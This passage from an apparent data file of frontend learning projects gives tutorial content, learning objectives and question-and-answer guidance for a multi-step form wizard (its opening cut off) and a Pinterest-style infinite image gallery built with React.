    introduction: 'Create a form wizard for a complex workflow (e.g., job application, insurance quote, onboarding). Each step validates independently, some steps appear conditionally based on previous answers, and users can navigate back without losing data. Add auto-save drafts and a final review step.\n\nMulti-step forms are ubiquitous in production web applications. Insurance quotes, job applications, checkout flows, onboarding sequences, and account setup all use the wizard pattern to break a complex form into manageable steps. Building one well requires mastering form state management, validation architecture, conditional logic, and accessibility patterns that are directly applicable to production work.\n\nThe engineering challenge goes beyond basic form handling. You need a unified form state that persists across steps, per-step validation that only validates the current step fields, conditional steps that appear or disappear based on previous answers (with proper data cleanup when steps become hidden), auto-save that persists drafts without disrupting the user flow, and a review step that summarizes all entered data with edit links back to specific steps.\n\nFor interviews, form handling is a practical skill that every frontend developer needs. A multi-step wizard demonstrates advanced patterns: React Hook Form integration with Zod for type-safe validation, conditional rendering with data-driven step configuration, focus management for accessibility between step transitions, and localStorage persistence with draft restoration.',
    interviewRelevance: 'Forms are the bread and butter of web apps. A multi-step wizard tests: form state management, validation architecture, conditional logic, accessibility (focus management between steps), and UX design (progress indication, error recovery). React Hook Form with Zod integration shows modern form handling patterns. Conditional steps demonstrate data-driven UI architecture. Auto-save with localStorage shows persistence thinking. The review step with edit links shows user experience awareness. Accessibility patterns (focus management, ARIA attributes, screen reader announcements) distinguish senior candidates. This project opens discussions about form analytics (which steps have highest drop-off), A/B testing form variations, and server-side validation mirroring.',
    learningObjectives: [
      'Build a step-based form system with per-step Zod schema validation',
      'Implement conditional steps that appear/hide based on previous answers',
      'Add a progress indicator with step titles, completed/current/upcoming states',
      'Create auto-save drafts using localStorage with debounced persistence',
      'Integrate React Hook Form with Zod resolver for type-safe field-level validation',
      'Build a review step that displays all entered data organized by step with edit links',
      'Implement step transition animations with Framer Motion for a polished feel',
      'Handle focus management: move focus to the first field or first error on step change',
      'Add keyboard shortcuts: Enter to advance when all fields are valid, Escape to go back',
      'Create a reusable wizard component that accepts step configuration as props for different form types',
    ],
    keyQuestions: [
      { question: 'How should I manage form state across steps?', answer: 'Use React Hook Form with a single useForm instance that spans all steps. Define the complete form schema with Zod: const formSchema = personalInfoSchema.merge(addressSchema).merge(employmentSchema).merge(preferencesSchema). Pass the merged schema to zodResolver but only validate the current step partial schema on each "Next" click by calling trigger() with the specific field names for that step. Store the full form data in a single state object managed by React Hook Form. This approach lets users navigate freely between steps without losing data because all fields persist in the same form context. Use useForm\'s defaultValues for initializing from a saved draft on page load. The key insight is that React Hook Form manages the full form state internally; you just control which subset of fields is validated and displayed per step.' },
      { question: 'How do conditional steps work?', answer: 'Define steps as a configuration array where each step can have an optional condition function: { id: "employment", title: "Employment Details", schema: employmentSchema, fields: ["employer", "role", "startDate", "salary"], condition: (data) => data.applicationType === "full-time" }. Compute the active steps by filtering the configuration array based on the current form data: const activeSteps = steps.filter(step => !step.condition || step.condition(formValues)). Recalculate active steps on every form value change so the progress indicator updates immediately when the user selects an option that adds or removes a conditional step. Critical edge case: when a previously completed conditional step becomes hidden (user changes "full-time" back to "part-time"), clear the data for that step fields to prevent stale data from being submitted. Call resetField() for each field in the hidden step.' },
      { question: 'How should auto-save work?', answer: 'Subscribe to form value changes via React Hook Form watch() and debounce saves by 2 seconds. On each debounced change, serialize the complete form data plus metadata to localStorage: { formId: "job-application", version: 1, data: formValues, currentStep: 2, savedAt: new Date().toISOString() }. On page load, check localStorage for a saved draft with a matching formId. If found, show a banner: "You have a saved draft from [date]. Resume or start fresh?" Resume initializes the form with the draft data and navigates to the saved step. Start fresh clears the draft. Show a subtle "Saving..." indicator during the debounce period and "Saved at 2:34 PM" when the save completes. Include a version field in the draft to handle schema migrations if the form structure changes. Clear the draft from localStorage on successful submission. Wrap the localStorage write in a try/catch to handle QuotaExceededError gracefully.' },
      { question: 'What accessibility concerns matter?', answer: 'Focus management is the most important accessibility concern for multi-step forms. When transitioning to a new step, programmatically move focus to the first input field of that step using a ref. If the transition was triggered by validation failure (user clicked Next but current step has errors), move focus to the first field with an error. The progress indicator should use role="progressbar" with aria-valuenow set to the current step number and aria-valuemax set to the total number of steps. The step navigation (if visible as clickable steps) should use role="navigation" with an aria-label like "Form progress". Each error message should be associated with its field via aria-describedby pointing to the error message element ID. When a step changes, announce the transition to screen readers using an aria-live="polite" region: "Step 3 of 5: Employment Details". Ensure all form controls have visible labels (not just placeholders) and that the tab order follows the visual order of fields.' },
      { question: 'How do I build the review step?', answer: 'The final review step displays all entered data organized by section (matching the steps), with an Edit button for each section that navigates back to that specific step. Render the data as a series of labeled key-value pairs: "Full Name: John Smith", "Email: john@example.com", with each step section having a heading and a horizontal rule separator. Use the step configuration to map field IDs to display labels. Format values appropriately: dates as "January 15, 2026", phone numbers as "(555) 123-4567", booleans as "Yes" or "No", and file uploads as the filename with a preview link. The Edit button for each section calls a setCurrentStep(stepIndex) function that navigates back to that step with all data preserved. After editing, the user can click Next to return through subsequent steps (which should still be valid) or jump directly back to Review if there is a navigation bar. Include a Submit button on the review step that performs final full-form validation against the complete Zod schema before submitting.' },
      { question: 'How do I handle file upload fields in the wizard?', answer: 'File uploads in multi-step forms have unique challenges: files cannot be serialized to localStorage for auto-save, and navigating away from a step should not lose the selected file. Store file references in a separate state outside React Hook Form: use a Map<fieldId, File> managed by a custom useFileUploads hook. When the user selects a file, store the File object in the map and display a preview (URL.createObjectURL for images, filename with size for other types). In the form data, store metadata (filename, size, type) but not the binary content. On form submission, use FormData to send both the JSON form data and the file binaries in a multipart request. For auto-save, save the file metadata to localStorage but not the files themselves. On draft restore, show a message: "Previously selected files need to be re-uploaded" with the filename as a reminder. On the review step, show file previews with the option to remove and re-upload. Validate file size and type constraints in the Zod schema using a custom validator.' },
    ],
  },
  {
    id: 'infinite-image-gallery',
    title: 'Infinite Image Gallery',
    icon: 'image',
    color: '#d946ef',
    difficulty: 'intermediate',
    estimatedTime: '4-6 hours',
    techStack: ['React', 'TypeScript', 'Intersection Observer', 'Tailwind CSS', 'Unsplash API'],
    questions: 6,
    description: 'Build a Pinterest-style masonry image gallery with infinite scroll, lazy loading, lightbox preview, and responsive breakpoints.',
    introduction: 'Create an image gallery that loads images as the user scrolls, arranged in a masonry (waterfall) layout. Images lazy-load as they enter the viewport, clicking opens a lightbox with zoom and navigation, and the layout adapts to screen width (1-4 columns).\n\nThe infinite image gallery combines several performance optimization techniques that are essential for modern web development. Masonry layout, lazy loading, intersection observer, responsive images, and virtualization are all patterns that appear in production image-heavy applications at companies like Pinterest, Unsplash, Instagram, and Flickr. Building this project gives you hands-on experience with each.\n\nThe masonry layout algorithm is particularly interesting: unlike a regular CSS Grid where all rows have the same height, masonry arranges items by placing each new image in the shortest column. This creates the distinctive Pinterest waterfall effect where images of different aspect ratios fit together without gaps. Implementing this efficiently requires tracking column heights and recalculating on resize.\n\nFor interviews at design-focused companies and media platforms, this project demonstrates performance optimization skills that directly impact Core Web Vitals: Largest Contentful Paint (lazy loading defers off-screen images), Cumulative Layout Shift (aspect ratio placeholders prevent layout jumps), and Interaction to Next Paint (virtualization keeps the DOM lean). These are the metrics that Google uses for search ranking and that product teams obsess over.',
    interviewRelevance: 'Tests performance optimization skills: lazy loading, intersection observer, layout algorithms (masonry), image optimization, and virtualization for large galleries. Common frontend challenge at design-focused companies. The masonry layout demonstrates algorithm design for visual layout. Lazy loading with Intersection Observer shows modern browser API knowledge. Image optimization with srcset and WebP demonstrates Core Web Vitals awareness. The lightbox with zoom and keyboard navigation shows interaction design depth. Infinite scroll with cursor-based pagination demonstrates API integration patterns. This project opens discussions about image CDN strategies, blur-up placeholder techniques, and progressive image loading.',
    learningObjectives: [
      'Implement masonry layout using CSS columns or a JavaScript-calculated positioning approach',
      'Build lazy loading with Intersection Observer for bandwidth-efficient image loading',
      'Create a lightbox with zoom, pan, keyboard navigation, and swipe gestures',
      'Add infinite scroll with cursor-based API pagination and loading skeletons',
      'Prevent Cumulative Layout Shift by reserving space with aspect-ratio placeholders',
      'Implement responsive images with srcset and sizes for optimal resolution per viewport',
      'Use ResizeObserver to dynamically adjust column count and recalculate masonry positions',
      'Build a blur-up placeholder technique that shows a low-resolution preview while loading',
      'Virtualize off-screen images in very large galleries to keep DOM node count manageable',
      'Integrate with the Unsplash API for a realistic infinite source of high-quality images',
    ],
    keyQuestions: [
      { question: 'CSS columns vs JS-calculated masonry?', answer: 'CSS columns (column-count: 3) is the simplest approach and requires zero JavaScript. However, it fills columns top-to-bottom, left-to-right: the first N images go into column 1, then the next N into column 2, and so on. This means the visual order does not match the data order (image 1 is in column 1, image 2 is also in column 1, image 4 might be in column 2). JavaScript masonry solves this: track the height of each column in an array. For each new image, place it in the shortest column. This gives the expected Pinterest flow where images appear in data order, left to right. Implementation: set the container to position: relative. For each image, calculate position: absolute with top set to the shortest column height and left set to the column index times the column width plus gap. After placing, update that column height by adding the image height plus the gap. CSS Grid with grid-row-end: span X (where X is calculated from the image aspect ratio) is a hybrid approach that keeps the DOM simpler while approximating masonry behavior.' },
      { question: 'How do I implement lazy loading?', answer: 'Create an Intersection Observer with rootMargin set to "200px 0px" which triggers the callback when an image is 200 pixels below the viewport (loading starts before the image scrolls into view for a seamless experience). Each image in the gallery starts as a placeholder div with the correct aspect ratio set via the CSS aspect-ratio property or a padding-bottom hack. The placeholder shows a skeleton shimmer animation or a tiny blurred version of the image (blur-up technique: load a 20px-wide version inline as a base64 data URL, display it at full size with CSS filter: blur(20px)). When the observer callback fires for a placeholder, set the src attribute on a real img element. On the image load event, crossfade from the placeholder to the loaded image using opacity transition. Disconnect the observer for that element after loading to prevent redundant callbacks. As a fallback for older browsers, add loading="lazy" to the img element, which is natively supported in all modern browsers but gives less control over the rootMargin preload distance.' },
      { question: 'How should the lightbox work?', answer: 'The lightbox is a fullscreen overlay that displays the selected image at high resolution. Structure: a fixed-position container covering the viewport with a semi-transparent dark backdrop (background: rgba(0,0,0,0.9)). The selected image is centered using flexbox or object-fit: contain to fill the available space while preserving aspect ratio. Navigation: left and right arrow buttons on the edges, X button to close in the top-right corner. Keyboard support: ArrowLeft and ArrowRight to navigate, Escape to close. Touch support: horizontal swipe to navigate (detect touchstart/touchmove/touchend with a minimum 50px swipe threshold). Zoom: mouse wheel scrolls zoom level (transform: scale(1) to scale(3)), double-click toggles between 1x and 2x zoom. When zoomed, click-and-drag to pan (translate the image within the viewport, clamping to prevent scrolling past the image edges). Preload the next and previous images in the background (new Image().src = nextImageUrl) so navigation feels instant. On open, animate the image expanding from the thumbnail position to the centered position using FLIP (First, Last, Invert, Play) animation technique for a smooth transition.' },
      { question: 'How do I handle responsive breakpoints?', answer: 'Use ResizeObserver on the gallery container (not window.innerWidth, because the gallery might be in a sidebar or nested layout where the container width differs from the viewport). Calculate column count based on container width: below 640px use 1 column, 640-1024px use 2 columns, 1024-1280px use 3 columns, 1280px and above use 4 columns. When the column count changes (browser resize, orientation change, sidebar toggle), recalculate all masonry positions. For a smooth transition, animate the position change using CSS transition on the absolutely-positioned images (transition: top 300ms ease, left 300ms ease). For responsive images, use the srcset attribute with multiple image sizes: srcset="photo-400.webp 400w, photo-800.webp 800w, photo-1200.webp 1200w" and sizes="(max-width: 640px) 100vw, (max-width: 1024px) 50vw, 33vw" so the browser loads the optimal resolution for each column width, saving bandwidth on mobile devices.' },
      { question: 'How do I prevent layout shift when images load?', answer: 'Cumulative Layout Shift (CLS) occurs when an image loads and pushes content below it downward, because the browser does not know the image dimensions until it finishes loading. Prevent this by reserving the correct space before the image loads. Two approaches: 1) If you know the image dimensions from the API (the Unsplash API provides width and height), set aspect-ratio: width / height on the container element, or use the padding-bottom hack: padding-bottom: (height / width * 100)%. This reserves exactly the right amount of space. 2) If dimensions are unknown, use a fixed aspect ratio (for example, 4:3 for landscape, 3:4 for portrait) and allow some variance when the actual image loads. The placeholder (skeleton or blur-up preview) should fill this reserved space. When the real image loads, it replaces the placeholder at the same dimensions, causing zero layout shift. Add width and height attributes to the img element as well, which allows the browser to calculate the aspect ratio from the HTML before CSS loads.' },
      { question: 'How do I virtualize a very large gallery?', answer: 'For galleries with over 1,000 images, even with lazy loading, having all 1,000+ img elements in the DOM causes memory pressure and slow scroll event handling. Virtualize the gallery: only mount image elements that are within a buffer zone of the viewport (for example, 2 viewport heights above and below). As the user scrolls, unmount images that leave the buffer and mount new images entering it. This keeps the DOM to roughly 50-100 image elements at any time. Implementation: use Intersection Observer with a generous rootMargin (for example, "200% 0px") to detect when images enter and leave the buffer zone. When an image leaves, replace the img element with a placeholder div of the same dimensions (so the masonry layout is preserved). When it re-enters, lazy-load the image again (it may still be in the browser cache for an instant load). @tanstack/react-virtual can handle this if you model the gallery as a virtual list where each item is a row of images. For the masonry layout, treat each column as a separate virtual list, which works well since columns scroll together.' },
    ],
  },
];
